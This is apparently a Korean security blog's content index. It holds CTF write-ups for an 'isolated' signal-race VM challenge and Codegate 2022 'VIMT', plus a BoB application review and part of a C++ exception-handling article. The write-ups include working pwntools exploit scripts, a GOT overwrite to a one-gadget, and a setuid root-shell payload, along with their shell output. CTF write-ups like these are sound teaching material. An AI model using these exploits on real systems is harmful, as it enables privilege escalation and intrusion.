// 0x15c2&#123;  int stack_idx; // eax  if ( g_stack_idx &gt; 767 )  &#123;    g_context-&gt;state = ERROR;  &#125;  else  &#123;    if ( log_enabled )      printf(&quot;[*] PUSH stack[0x%x] = 0x%x\\n&quot;, (unsigned int)g_stack_idx, g_context-&gt;reg);    stack_idx = g_stack_idx++;    stack[stack_idx] = g_context-&gt;reg;    g_context-&gt;state = SUCCESS;  &#125;&#125;\npop_handler 함수는 g_stack_idx 가 0이 아닌 경우 1을 감소시키고, stack[g_stack_idx] 를 g_context-&gt;reg 에 대입합니다.\nvoid pop_handler()  // 0x164d&#123;  if ( g_stack_idx )  &#123;    if ( log_enabled )      printf(&quot;[*] POP stack[0x%x] == 0x%x\\n&quot;, (unsigned int)(g_stack_idx - 1), stack[g_stack_idx - 1]);    g_context-&gt;reg = stack[--g_stack_idx];    g_context-&gt;state = SUCCESS;  &#125;  else  &#123;    g_context-&gt;state = ERROR;  &#125;&#125;\nclean_handler 함수는 g_stack_idx 를 0으로 초기화시킵니다.\nvoid clean_handler()  // 0x16f7&#123;  if ( log_enabled )    puts(&quot;[*] CLEAN STACK&quot;);  stack[0] = 0;  g_stack_idx = 0;  g_context-&gt;state = SUCCESS;&#125;\nlog_handler 함수는 log_enabled 에 g_context-&gt;reg 를 대입합니다.\nvoid log_handler()  // 0x1736&#123;  puts(&quot;[!] I prepared log feature for you :)&quot;);  log_enabled = g_context-&gt;reg;  g_context-&gt;state = SUCCESS;&#125;\n가상머신의 전체 구조를 훑어보았습니다. 이제 다시 자식 프로세스로 돌아가 run 함수에서 opcode를 파싱하는 코드를 살펴보겠습니다. run 함수는 switch 구문을 반복하면서 파싱을 수행하는데, 각각의 case 블록에서 공통적인 부분은 다음과 같습니다.\n\nPUSH 를 제외한 인자가 있는 opcode는 인자를 opcode에 포함하여 전달할지,  stack 에서 POP 하여 전달할지 플래그 값을 통해 선택할 수 있습니다.\n\n플래그 값이 \\x66 이면 opcode가 인자를 포함하고 있고, \\x55 면 send_locked 함수를 호출하여 POP 명령을 수행한 후 결과를 인자로 전달합니다.\n\n\nADD , SUB , MUL , DIV , CMP 는 opcode의 구조가 완전히 동일하며, 이 중 CMP 를 제외한 나머지는 send_locked 함수를 호출하여 결과를 stack 에 PUSH 합니다.\n\n다음은 opcode를 파싱하는 switch 구문입니다. 각각의 opcode는 첫 바이트가 종류를 나타내며 case에 해당합니다. 나머지 바이트들은 주석에 나타낸 바와 같이 플래그 값과 경우에 따라 인자들로 구성되어 있습니다.\nswitch ( code[op] )&#123;  case 0:                                   // PUSH [u32 arg1]    push_arg1 = *(_DWORD *)&amp;code[pc];    pc += 4;    send(ppid, context, PUSH, push_arg1);    break;  case 1:                                   // POP    send(ppid, context, POP, 0);    break;  case 2:                                   // ADD [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]                                            // add two arguments and push    _pc = pc;    v21 = pc + 1;    add_flag1 = code[_pc];    if ( add_flag1 == 0x66 )    &#123;      add_arg1 = *(_DWORD *)&amp;code[v21];      v21 += 4;    &#125;    else    &#123;      if ( add_flag1 != 0x55 )        exit(-1);      send_locked(ppid, context, POP, 0);      add_arg1 = context-&gt;reg;    &#125;    v6 = v21;    pc = v21 + 1;    add_flag2 = code[v6];    if ( add_flag2 == 0x66 )    &#123;      add_arg2 = *(_DWORD *)&amp;code[pc];      pc += 4;    &#125;    else    &#123;      if ( add_flag2 != 0x55 )        exit(-1);      send_locked(ppid, context, POP, 0);      add_arg2 = context-&gt;reg;    &#125;    send_locked(ppid, context, PUSH, add_arg2 + add_arg1);    break;  case 3:                                   // SUB [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]                                            // subtract two arguments and push    // ...  case 4:                                   // MUL [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]                                            // multiply two arguments and push    // ...  case 5:                                   // DIV [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]                                            // divide two arguments and push    // ...  case 6:                                   // CMP [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]                                            // compare two arguments and save result to eflags    // ...  // ...  case 9:                                   // CLEAN    send_locked(ppid, context, CLEAN, 0);    break;  case 10:                                  // LOG [u8 arg1] [u32 optional arg2]    // ...  default:    send(ppid, context, (enum signal)9u, 0);// SIGKILL    exit(-1);&#125;\n문제 풀이\n자식 프로세스의 시스템 콜 필터링으로 인해 앞서 언급한 바와 같이 부모 프로세스를 익스플로잇해야 합니다. 익스플로잇은 다음과 같은 취약점을 바탕으로 수행합니다.\n\ng_stack_idx 의 자료형이 int 로, push_handler 와 pop_handler 함수에서 충분하지 않은 경계 검사를 수행하고 있습니다.\n\ng_stack_idx 의 값을 음수로 만들 수 있다면 두 함수의 경계 검사를 모두 통과하여, stack 보다 낮은 주소의 메모리에 대한 읽기와 쓰기가 가능합니다.\n\n\nPUSH 와 POP opcode는 블로킹 방식의 send_blocked 함수가 아닌 send 함수를 호출하고 있습니다.\n\nrun 함수의 switch 구문을 보면 PUSH 와 POP opcode를 처리하는 case 블록에서 단순히 send 함수를 호출하여 시그널을 전송하도록 하고 있습니다. send 함수는 send_blocked 함수와 달리 부모 프로세스에서 실행 중인 핸들러 함수가 종료할 때까지 기다리는 메커니즘이 존재하지 않아, 연속하여 호출할 경우 의도하지 않은 결과를 일으킬 수 있습니다.\nswitch ( code[op] )&#123;  case 0:                                   // PUSH [u32 arg1]    push_arg1 = *(_DWORD *)&amp;code[pc];    pc += 4;    send(ppid, context, PUSH, push_arg1);    break;  case 1:                                   // POP    send(ppid, context, POP, 0);    break;  // ...\n시그널 핸들러로의 흐름 전환은 유저 모드의 코드를 실행하고 있는 한 언제나 발생할 수 있습니다. 따라서 원칙적으로 핸들러 함수는 재진입성이 보장되어야(reentrant) 하며, 최소한 시그널의 전달 자체만이라도 블로킹 방식으로 이루어져야 합니다. 여기서 재진입성의 보장이란 핸들러 함수를 실행하는 도중 임의 시점에서 시그널을 받아 함수 내부에서 같은 핸들러 함수를 호출하더라도, 기존 핸들러 함수의 실행 결과에 영향을 주지 않아야 함을 의미합니다.\n그러나 push_handler 와 pop_handler 함수에서 이루어지는 g_stack_idx 전역 변수에 대한 증감 연산은 원자적이지 않을(non-atomic) 뿐더러, 시그널의 전송 과정도 블로킹 방식을 사용하고 있지 않습니다. 예를 들어 g_stack_idx 의 값이 1이고 두 개의 POP opcode를 파싱하여 시그널을 전송하는 상황을 생각해보겠습니다. 만약 전송이 블로킹 방식으로 이루어졌다면 다음과 같이 pop_handler 의 조건문에 의해 g_stack_idx 의 값은 음수가 될 수 없습니다.\n\n그런데 블로킹 방식이 아닌 상황에서는 pop_handler 의 조건문을 통과한 상태에서 다음과 같이 추가적인 시그널에 인한 재진입이 발생할 수 있습니다. 이 경우 재진입한 핸들러를 포함하여 g_stack_idx 에 대한 증감 연산이 두 번 모두 이루어져 값이 음수가 될 수 있습니다.\n\npush_handler 와 pop_handler 는 각각 g_stack_idx 가 767보다 작거나 같은지, 0이 아닌지만 검사합니다. 따라서 일단  g_stack_idx 의 값을 음수로 만들고 나면 연속된 POP opcode 등으로 얼마든지 값을 감소시켜, stack 보다 낮은 주소의 메모리에 대한 자유로운 읽기와 쓰기가 가능해집니다. puts.got 는 stack 보다 낮은 주소에 있고 puts 라이브러리 함수의 주소가 저장되어 있으므로, SUB opcode 등을 이용하여 oneshot 가젯의 주소로 변조하면 셸을 획득할 수 있습니다.\n다음은 위의 내용을 바탕으로 작성한 익스플로잇 코드입니다. 37행은 CLEAN , 2번의 PUSH , 3번의 POP 을 반복하여 g_stack_idx 의 값이 음수가 되도록 합니다. 46행은 블로킹 방식의 POP 을 반복하여 puts.got 를 참조할 수 있도록 g_stack_idx 를 감소시키는데, 반복 횟수는 실행 환경에 따라 시행착오를 거쳐야 합니다. 52행은 SUB opcode를 사용해 puts.got 에 oneshot 가젯의 주소를 대입합니다. 익스플로잇 코드를 성공할 때까지 수차례 실행하면 셸을 획득할 수 있습니다.\n#!/usr/bin/python3from pwn import *r = remote(&quot;localhost&quot;, 7777)# r = process(&quot;./isolated&quot;)def pop():    return p8(1)def __opcode(op, pop1, pop2, args=[0, 0]):    s = p8(op) + (p8(0x55) if pop1 else p8(0x66) + p32(args[0]))    s += (p8(0x55) if pop2 else p8(0x66) + p32(args[1]))    return sdef sub(pop1, pop2, args=[0, 0]):    return __opcode(3, pop1, pop2, args)def cmp(pop1, pop2, args=[0, 0]):    return __opcode(6, pop1, pop2, args)def clean():    return p8(9)def log(pop, arg=0):    return p8(10) + (p8(0x55) if pop else p8(0x66) + p32(arg))def main():    # start race    payload = log(False, 1)    for i in range(10):        payload += clean()        payload += sub(False, False, [0, 0])        payload += sub(False, False, [0, 0])        payload += pop()        payload += pop()        payload += pop()    # set stack_idx to -59    for i in range(27):        payload += cmp(True, True)    for i in range(10):        payload += sub(True, False, [0, 0])    # set puts.got to oneshot    payload += sub(True, False, [0, 0x3166e])    # trigger oneshot    payload += log(False, 1)    r.sendafter(b&quot;opcodes &gt;&quot;, payload)    r.interactive()if __name__ == &quot;__main__&quot;:    main()\n$ ./ex.py[+] Opening connection to localhost on port 7777: Done[*] Switching to interactive mode[!] I prepared log feature for you :)# ...[*] POP stack[0xffffffc5] == 0xf7a62aa0[*] PUSH stack[0xffffffc5] = 0xf7a31432$ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n참고자료\n[1] M. Dowd, J. McDonald and J. Schuh, “Chapter 13. Synchronization and State,” in The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities. Boston, MA: Addison-Wesley, 2006, pp. 797-821.\n\n\n","categories":["Security","CTF"]},{"title":"[Codegate CTF 2022] VIMT","url":"/2022/07/05/codegate22-vimt/","content":"개요\n\nMonkeys help you\n\nchall.zip\n문제 분석\n64비트 x86_64 바이너리 app 과 Dockerfile 등이 주어집니다. 바이너리는 심볼이 있고, NX 보호 기법이 적용되어 있습니다.\n$ checksec app[*] &#x27;/home/user/study/ctf/codegate22/vimt/app&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nDockerfile 을 살펴보면 서버에서 바이너리에 setuid 권한을 부여하고 있으며, SSH 접속 가능한 계정과 비밀번호를 제공합니다. 따라서 주어진 바이너리를 통하여 root 권한의 셸을 획득하는 것이 목표임을 추측할 수 있습니다.\n# ...RUN echo &quot;/home/ctf/app&quot; &gt; /home/ctf/.bash_profileRUN echo &quot;exit&quot; &gt;&gt; /home/ctf/.bash_profileRUN chown root:root /home/ctf/appRUN chown root:root /home/ctf/tmpRUN chmod 640 /home/ctf/appRUN chmod +x /home/ctf/appRUN chmod u+s /home/ctf/app# ...RUN echo &#x27;ctf:ctf1234_smiley&#x27; | chpasswdRUN chsh -s /bin/bash ctf\n바이너리를 실행하면 문제의 이름처럼 Vim 에디터와 유사한 화면을 출력하는데, “hello world” 문자열을 입력했더니 각 문자 뒤에 쓰레기 값을 덧붙입니다.\n\nmain 함수에서 핵심적인 부분만 살펴보면 다음과 같습니다. 7행에서 init 함수를 호출하여 각종 전역 변수를 설정합니다. 15행에서 getch 함수로 문자를 입력받아 switch-case 구문에 넘깁니다. 문자가 Backspace인 경우 deleteKey 함수를 호출하고, 일반 문자의 경우 inputKey 함수를 호출하여 처리합니다. 문자가 Esc인 경우 Vim의 명령 모드(command mode)와 같이 cmd 에 추가적으로 커맨드를 입력받고, 52행부터 해당하는 커맨드의 함수를 호출합니다.\nint __cdecl __noreturn main()&#123;  // ...  cmd = (char *)calloc(1uLL, 256uLL);  v4 = 0;  v3 = 0;  init();  setuid(0);  while ( 1 )  &#123;    // ...              while ( !v3 )              &#123;                draw();                c = getch();                switch ( c )                &#123;                  case 0x1B:                    // Esc                                                // switch to command mode                    v3 = 1;                    printf(&quot;\\n:&quot;);                    break;                  case 0x7F:                    // Backspace                    if ( deleteKey() == -1 )                      v3 = 2;                    break;                  case 0xA:                    if ( cur_y &lt; y )                    &#123;                      ++cur_y;                      cur_x = 0;                    &#125;                    break;                  default:                    if ( inputKey(c) == -1 )                      v3 = 2;                    break;                &#125;              &#125;              // ...              _c = getch();              if ( _c == &#x27;\\n&#x27; )                break;              if ( v4 &lt; 255 )              &#123;                v0 = v4++;                cmd[v0] = _c;                printf(&quot;%c&quot;, _c);              &#125;            &#125;      // ...      if ( !strncmp(&quot;set&quot;, cmd, 3uLL) )        break;      // ...      else if ( !strncmp(&quot;compile&quot;, cmd, 7uLL) )      &#123;        if ( compile() != -1 )          memset(cmd, 0, 0x100uLL);        v3 = 2;      &#125;    // ...    if ( setAxis(cmd) != -1 )      goto LABEL_45;    v3 = 2;  &#125;&#125;\ninit 함수는 6행에서 ioctl 시스템 콜을 호출하고, 결과를 전역 변수 x 와 y 에 대입합니다. /usr/include/asm-generic/ioctls.h 파일을 참고하면 요청 번호 0x5413 은 TIOCGWINSZ 로, 현재 터미널의 가로와 세로 크기를 구하는 요청입니다. 10행에서 터미널의 크기를 바탕으로 문자를 입력받을 2차원 배열 map 을 할당합니다. 16행에서는 각종 값으로 생성한 난수를 이용해 rand 함수의 seed를 초기화하고 있습니다.\nvoid __fastcall init()&#123;  // ...  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  ioctl(1, 0x5413uLL, &amp;sz);                     // ioctl(1, TIOCGWINSZ, &amp;sz)  x = sz.ws_col;  y = sz.ws_row - 2;  // ...  map = (char **)calloc(1uLL, 8LL * (y + 1));  for ( i = 0; i &lt; y; ++i )    map[i] = (char *)calloc(1uLL, x + 1);  v3 = clock();  v2 = time(0LL);  v0 = getpid();  seed = mix(v3, v2, v0);  srand(seed);&#125;\ninputKey 함수는 일반적인 문자 입력을 처리하는 함수입니다. cur_x , cur_y 는 현재 커서가 위치한 좌표를 나타내는 전역 변수로, 10행은 커서가 터미널의 가로 길이 끝까지 간 경우 줄바꿈하는 코드입니다. 19행에서 입력받은 문자를 2차원 배열 map 상에서 커서의 위치에 대입합니다. 20행의 반복문을 보면 문자 뒤로 랜덤한 5개의 문자를 추가하고 있는데, 이 부분의 코드가 원하는 문자열을 그대로 입력할 수 없었던 원인입니다.\nint __fastcall inputKey(char c)&#123;  char *row; // rcx  int xpos; // esi  char random_byte; // di  char *_row; // rsi  int _xpos; // ecx  int i; // [rsp+8h] [rbp-8h]  if ( cur_x &gt;= x )  &#123;    cur_x = 0;    ++cur_y;  &#125;  if ( cur_y &gt;= y )    cur_y = y - 1;  row = map[cur_y];  xpos = cur_x++;  row[xpos] = c;  for ( i = 0; i &lt; 5; ++i )  &#123;    if ( cur_x &gt;= x )    &#123;      cur_x = 0;      ++cur_y;    &#125;    if ( cur_y &gt;= y )      cur_y = y - 1;    random_byte = ascii[rand() % 86];    _row = map[cur_y];    _xpos = cur_x++;    _row[_xpos] = random_byte;  &#125;  return 0;&#125;\ndeleteKey 함수는 Backspace 입력을 처리하는 함수입니다. Backspace를 한 번 입력할 때마다 반복문을 통해 현재 커서 위치에서 6개의 문자를 지웁니다.\nint __fastcall deleteKey()&#123;  char *row; // rax  int i; // [rsp+0h] [rbp-Ch]  for ( i = 0; i &lt;= 5; ++i )  &#123;    if ( cur_x &lt; 0 )    &#123;      cur_x = 0;      --cur_y;    &#125;    if ( cur_y &lt; 0 )    &#123;      cur_y = 0;      return -1;    &#125;    row = map[cur_y];    row[--cur_x] = 0;  &#125;  return 0;&#125;\nsetAxis 함수는 Esc 입력 후 “set y &lt;N&gt;” 커맨드를 처리하는 함수입니다. 21행에서 cur_y 전역 변수에 커맨드 매개변수로 전달된 정수 N을 대입합니다. 예를 들어 Esc 입력 후 &quot;set y 0&quot;을 입력하면, 커서의 세로축 위치가 첫 번째 줄로 이동합니다.\nint __fastcall setAxis(char *cmd)&#123;  size_t len; // rax  size_t _len; // rax  int n; // [rsp+1Ch] [rbp-24h]  char *s; // [rsp+20h] [rbp-20h]  char v6; // [rsp+2Fh] [rbp-11h]  if ( strlen(cmd) &lt;= 6 )    return -1;  len = strlen(cmd);  s = (char *)calloc(1uLL, len - 6 + 1);  v6 = cmd[4];  _len = strlen(cmd);  memcpy(s, cmd + 6, _len - 6);  n = atoi(s);  if ( v6 != &#x27;y&#x27; &amp;&amp; v6 != &#x27;Y&#x27; )    goto LABEL_8;  if ( n &gt;= 0 &amp;&amp; n &lt;= y - 1 )  &#123;    cur_y = n;LABEL_8:    free(s);    return 0;  &#125;  return -1;&#125;\ncompile 함수는 Esc 입력 후 “compile” 커맨드를 처리하는 함수입니다. 17~25행에서 map 의 내용을 tmp/ 경로에 .c 확장자를 가진 파일로 저장합니다. 30행에서 system 함수를 호출하여 gcc 를 실행해 저장한 파일을 바이너리로 컴파일하고, 32행에서 성공하면 컴파일된 바이너리를 다시 system 함수로 실행합니다.\nint __fastcall compile()&#123;  // ...  _map = (char *)calloc(1uLL, (y + 1) * (x + 1) + 1);  idx = 0;  for ( i = 0; i &lt; y; ++i )  &#123;    for ( j = 0; j &lt; x; ++j )    &#123;      _map[idx] = map[i][j];      // ...    &#125;  &#125;  hexstring = randomHexString(32);  hexstring_len = strlen(hexstring);  c_file = (char *)calloc(1uLL, hexstring_len + 7);  sprintf(c_file, &quot;tmp/%s.c&quot;, hexstring);  v1 = strlen(hexstring);  exec_file = (char *)calloc(1uLL, v1 + 7);  sprintf(exec_file, &quot;tmp/%s&quot;, hexstring);  fd = open(c_file, 0x42, 420LL);  if ( fd &lt; 0 )    return -1;  v2 = strlen(_map);  write(fd, _map, v2);  close(fd);  v5 = strlen(c_file);  v3 = strlen(exec_file);  cmd = (char *)calloc(1uLL, v3 + v5 + 9);  sprintf(cmd, &quot;gcc -o %s %s&quot;, exec_file, c_file);  system(cmd);  if ( !access(exec_file, 0) )    system(exec_file);  // ...\n문제 풀이\n문제 바이너리에 setuid 권한이 있으므로, 셸을 실행하는 C 소스 코드를 입력한 후 “compile” 커맨드로 컴파일하여 실행하면 root 권한의 셸을 얻을 수 있습니다. 다만  문자를 입력할 때마다 랜덤한 문자 5개가 함께 입력된다는 문제가 있는데, 터미널의 크기를 잘 조정하고 “set y &lt;N&gt;” 커맨드를 적절히 사용하면 원하는 문자열만 입력되도록 할 수 있습니다.\n예를 들어 터미널의 가로 크기가 47일 때, “main()” 문자열을 입력해 보겠습니다. 먼저 첫 번째 문자인 ‘m’ 을 입력한 후 map 배열의 상태를 살펴보겠습니다. 초록색 문자는 입력한 문자, 흰색 문자는 랜덤으로 입력된 문자, 두꺼운 수직 바는 입력 후 커서의 위치를 나타냅니다. 입력한 ‘m’ 은 배열의 map[0][0] 에 저장됩니다.\n\n‘m’ 을 한번 더 입력해 보겠습니다. 이전의 입력에서 추가된 랜덤한 5바이트의 문자열로 인해, 이번 ‘m’ 은 배열의 map[0][6] 에 저장됩니다.\n\n이와 같이 ‘m’ 을 모두 8번 입력해 보겠습니다. 8번째로 입력한 ‘m’ 은 map[0][42] 에 저장됩니다. 이후 랜덤한 문자열이 추가되는데, 줄바꿈이 일어나 최종적으로 입력 후 커서의 위치가 map[1][1] 이 된 것을 확인할 수 있습니다.\n\n이 상태에서 “set y 0” 커맨드를 실행하면, cur_y 전역 변수의 값만 0으로 바뀌면서 커서의 위치가 map[0][1] 로 이동합니다.\n\n따라서 입력할 문자열의 두 번째 문자인 ‘a’ 를 입력하면, 의도했던 대로 ‘ma’ 를 입력할 수 있게 됩니다. 즉, 각 문자를 입력할 때마다 8번씩 입력한 후 “set y 0” 을 실행하면 모든 문자를 의도한 위치에 입력할 수 있습니다.\n\n이 방법을 사용하여 코드를 작성하기 위해서는 전체 코드에 줄바꿈이 없어야 하고, 코드의 길이가 터미널의 가로 크기인 47바이트보다 짧아야 합니다. 코드의 길이를 줄이기 위해 다음과 같은 gcc 의 트릭을 사용할 수 있습니다.\n\n함수 리턴 타입을 명시하지 않으면 기본값으로 int 를 반환합니다.\n라이브러리 함수의 헤더를 #include 하지 않아도, 링킹 과정에서 동일한 프로토타입의 함수를 resolve하여 호출할 수 있도록 합니다.\n\nWhere does GCC find printf ? My code worked without any #includeI am a C beginner so I tried to hack around the stuff.\nI read stdio.h and I found this line:\nextern int printf (const char *__restrict __format, ...);\nSo I wrote this code and i have no idea why it...Stack Overflow\n다음은 위의 트릭을 사용하여 작성한 셸을 실행하는 41바이트의 C 코드입니다.\nmain() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\n이 코드를 앞서 사용한 8번 입력 후 “set y 0” 커맨드를 실행하는 방법으로 입력한 후 map 배열의 상태는 다음과 같습니다. 커서는 map[0][41] 에 위치하고 있으며, map[0] 의 코드 뒷부분, map[1] 에 거쳐 랜덤한 문자들이 많이 남아있는 상황입니다.\n\n그런데 코드의 길이가 정확히 41바이트이므로, 현재 커서 위치에서 아무 문자 하나를 입력한 후(실제로는 6개가 입력됩니다) Backspace를 입력하여 deleteKey 함수를 호출하면 map[0] 의 뒷부분에 위치한 랜덤한 문자는 모두 지울 수 있습니다.\n다음 그림에서 붉은 문자는 입력 후 Backspace에 지워지는 문자들입니다. inputKey 함수에서 줄바꿈은 새로운 문자를 입력받기 전 이전 입력에 대한 cur_x 값의 변화를 기준으로 수행합니다. inputKey 함수가 리턴한 이후 deleteKey 함수 호출 시점에서 커서의 위치는 줄바꿈이 아직 일어나지 않은 map[0][47] 이므로, 랜덤한 문자만 깔끔하게 지울 수 있게 됩니다.\n\n이후 “set y 1” 커맨드로 커서의 위치를 map[1][41] 로 옮긴 후, 동일하게 아무 문자 하나를 입력하고 Backspace를 8번 입력하면 map[1] 의 모든 문자를 지울 수 있습니다. 이제 의도했던 대로 정확히 소스 코드만 입력되었습니다. “compile” 커맨드로 바이너리를 컴파일한 후 실행하면 root 권한의 셸을 획득하게 됩니다.\n\n다음은 위의 내용을 바탕으로 작성한 익스플로잇 코드입니다. 4행은 sshpass 커맨드로 SSH 접속을 수행하고, 35행은 서버에서 stty 커맨드로 가상 터미널의 가로와 세로 크기를 지정합니다. 입력할 코드를 전송하는 과정에서 순서가 꼬여 실패하는 경우가 있는데, 익스플로잇 코드를 몇 번 실행하면 root 권한의 셸을 획득할 수 있습니다.\n#!/usr/bin/python3from pwn import *r = process(&quot;sshpass -e ssh -tt ctf@localhost -p 1234 &#x27;bash -i&#x27;&quot;,            shell=True, env=&#123;&quot;SSHPASS&quot;: &quot;ctf1234_smiley&quot;&#125;)context.log_level = &quot;debug&quot;def set_axis(n):    r.send(b&quot;\\x1b&quot;)    r.sendline(b&quot;set y &quot; + str(n).encode())def input_key(c):    for i in range(8):        r.send(p8(c))    set_axis(0)def clean():    set_axis(0)    r.send(b&quot;a&quot;)    r.send(b&quot;\\x7f&quot;)    set_axis(1)    r.send(b&quot;a&quot;)    for i in range(8):        r.send(b&quot;\\x7f&quot;)def compile():    r.send(b&quot;\\x1b&quot;)    r.sendline(b&quot;compile&quot;)def main():    r.sendlineafter(b&quot;~$&quot;, b&quot;stty cols 47 rows 4&quot;)    r.sendlineafter(b&quot;~$&quot;, b&quot;./app&quot;)    payload = b&quot;main() &#123;setuid(0);execve(\\&quot;/bin/sh\\&quot;,0,0);&#125;&quot;    for c in payload:        input_key(c)    clean()    compile()    r.interactive()if __name__ == &quot;__main__&quot;:    main()\n$ ./ex.py# ...    b&#x27;-----------------------------------------------main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;      \\r\\n&#x27;    b&#x27;                                               \\r\\n&#x27;    b&#x27;-----------------------------------------------\\r\\n&#x27;    b&quot;:compiletmp/c7fd17d084a218713d385deb3df85bd1.c:1:1: warning: return type defaults to &#x27;int&#x27; [-Wimplicit-int]\\r\\n&quot;    b&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\\r\\n&#x27;    b&#x27;      | ^~~~\\r\\n&#x27;    b&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c: In function &#x27;main&#x27;:\\r\\n&quot;    b&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:9: warning: implicit declaration of function &#x27;setuid&#x27; [-Wimplicit-function-declaration]\\r\\n&quot;    b&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\\r\\n&#x27;    b&#x27;      |         ^~~~~~\\r\\n&#x27;    b&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:19: warning: implicit declaration of function &#x27;execve&#x27; [-Wimplicit-function-declaration]\\r\\n&quot;    b&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\\r\\n&#x27;    b&#x27;      |                   ^~~~~~\\r\\n&#x27;    b&#x27;# &#x27;# ...# $ id[DEBUG] Sent 0x3 bytes:    b&#x27;id\\n&#x27;[DEBUG] Received 0x4 bytes:    b&#x27;id\\r\\n&#x27;[DEBUG] Received 0x2c bytes:    b&#x27;uid=0(root) gid=1000(ctf) groups=1000(ctf)\\r\\n&#x27;\n\n\n","categories":["Security","CTF"]},{"title":"KITRI BoB 9기 최종합격 / 서류, 면접 후기 (1)","url":"/2022/06/09/kitri-bob-9-1/","content":"개요\n\n감사하게도 적지 않은 분들의 큰 도움으로 KITRI BoB 9기에 최종 합격할 수 있었습니다. 이번 글에서는 그간 준비 과정과 서류, 면접 경험을 공유하여 다른 분들께 많은 도움이 되었으면 합니다.\n준비 과정\n\n공부는 고등학생 때 웹 해킹을 잠깐, 대학 진학 후 시스템 해킹을 일년 반 정도 공부했습니다.\n공부한 내용을 주로 동아리 스터디에서 공유하면서, 동아리 활동 경험 부분에서 할 이야기가 많아졌습니다.\n주로 워게임 문제를 풀면서 공부한 내용을 복습했습니다.\n\npwnable.kr을 절반, pwnable.xyz는 7문제 정도 제외하고 전부 풀었습니다.\n\n\n\n서류 전형\n\n자기소개서는 7개 문항에 각 1,000자씩으로 작년과 동일했습니다.\n자기소개\n\n해킹을 접하고 공부하게 된 계기, 대학교 1~2학년 때 공부하고 활동한 이야기를 주로 적었습니다.\n저는 공부할 때 문서나 백서, 전공서적을 참고하는 것을 중요하게 생각하는데, 그 부분을 강조하였습니다.\n보안과 관련된 어떤 주제를 왜, 어떻게 공부해서 어떤 성과를 냈는지가 충분히 포함되면 좋을 듯 합니다.\n\n\n본인이 이룬 가장 큰 성과 및 사례\n\n전공수업에서 학교 포털시스템을 모의해킹할 기회가 있었는데, 그 때 경험과 느낀 점을 적었습니다.\n이 항목은 개인차가 크겠지만, 어떤 계기로 어떤 기술을 사용했고, 어떤 것을 배웠다는 내용이면 좋을 듯 합니다.\n\n\n지원 동기\n\n저는 크게 지원한 이유와, BoB에서 나 자신을 위해, 사회를 위해 하고 싶은 일로 나누었습니다.\n지원 동기에서 열정과 목표가 드러나고, 그 목표를 실현 가능하다는 실력이나 잠재력의 근거가 다른 항목과 같이 충분히 드러나면 좋을 듯 합니다.\n\n\n합격 후 포부\n\nCTF에 나가고 싶다, 현실 사례를 이야기하며 이런 프로젝트를 해보고 싶다는 내용을 주로 적었습니다.\n이 항목은 정말 BoB에서 하고 싶은 일을 조리있게 적으면 될 것 같습니다.\n\n\n관심 분야\n\n저는 시스템 해킹 분야에서 공부하며 기록을 남기고, 동아리원들과 스터디한 이야기를 적었습니다.\n지원한 트랙과 관련하여 경험이 어느 정도 있는 분들은 상세한 경험을 관심분야 항목에 녹여내면 좋을 듯 합니다.\n경험이 많지 않은 분들도 이런 분야에 흥미가 있으며, 그래서 이런 내용을 지금 공부하고 있다는 내용이 있으면 충분합니다.\n\n\nBoB 학습계획\n\nBoB 홈페이지에서는 공통 교육 기간에 모든 트랙의 기초 수업을, 트랙별 교육 단계에서 심화된 내용을 교육한다고 밝히고 있습니다.\n따라서 공통 교육 단계에서 기초적인 소양을 키우고, 트랙별 교육 단계에서 본인이 관심있는 분야의 이떤 세부적인 주제를 공부하겠다는 내용이 좋을 듯 합니다.\n\n\n진로 계획\n\n진로 계획은 학습 계획과 달리 BoB 이수 이후에 초점을 맞춘 항목입니다.\n그러므로 랩 인턴, 취업, 연구 등을 통해 관심있는 분야의 최신 주제를 공부하고 전문가가 되겠다는 포부를 밝히면 좋을 듯 합니다.\n\n\n\n필기와 면접 이야기는 다음 글에서 계속하겠습니다. 서류 전형과 관련해 질문이 있으시면, 댓글이나 이메일 통해서 최대한 답변 드리겠습니다!\n\n\n","categories":["Thoughts"]},{"title":"C++ 예외 처리의 구현","url":"/2022/07/17/cpp-exception-handling/","content":"개요\nC++의 예외 처리에 사용되는 try-catch 구문을 컴파일러 수준에서 어떻게 구현하고 있는지 살펴보겠습니다.\n예외 처리\ntry-catch 구문\n예외 처리(exception handling)는 프로그램의 실행 중 발생하는 비정상적인 상황에 대응하기 위한 방법론을 의미합니다. 예외 처리를 사용하는 프로그램은 보통 비정상 상황을 발견하고 예외를 일으키는 부분과 예외에 대응하는 부분이 나누어져 있습니다. C++의 예외 처리는 throw 구문으로 예외를 일으키고, try-catch 구문으로 예외에 대응하는 방식을 사용하고 있습니다.\nthrow 구문은 인자를 받아 예외를 일으킵니다. 일반적으로 std::exception 을 상속한 std::runtime_error 등의 예외 클래스를 인자로 사용하지만, 실제로는 정수형 값이나 문자열 등 아무 값이나 인자로 전달할 수 있습니다.\nif (password.length() &lt; 8) &#123;    throw std::runtime_error(&quot;Error&quot;);&#125;\ntry-catch 구문은 try 블록과 catch 블록으로 나누어집니다. try 블록 이후에 하나 이상의 catch 블록이 이어지며, try 블록의 코드에서 발생한 예외에 대해 catch 블록의 코드가 대응합니다. catch 블록은 자신이 대응할 예외의 타입을 선언하여 해당하는 타입의 예외가 발생하였을 경우에만 코드를 실행합니다. 만약 발생한 예외에 해당하는 catch 블록이 존재하지 않아 예외를 처리할 수 없으면 내부적으로 